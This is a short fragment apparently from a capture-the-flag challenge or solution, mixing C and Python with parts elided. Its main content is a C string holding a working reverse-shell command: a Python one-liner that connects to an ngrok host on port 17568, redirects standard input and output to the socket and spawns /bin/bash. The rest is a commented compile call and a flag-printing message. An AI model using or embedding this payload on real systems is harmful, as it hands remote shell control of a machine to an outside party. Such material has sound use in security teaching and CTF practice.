...
int main() {
    ...
    const char *command = \"export RHOST=\\\"0.tcp.ap.ngrok.io\\\";export RPORT=17568;/bin/python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\\\"RHOST\\\"),int(os.getenv(\\\"RPORT\\\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\"/bin/bash\\\")'\";
...
# subprocess.run(
#     ["sudo", "-u", "nobody", "gcc", "-o", output_path, source_path],
#     shell=False,
...
terminate(
    "Wow! You clearly recovered the file so here is your flag: {}".format(FLAG),
    output_path,
)
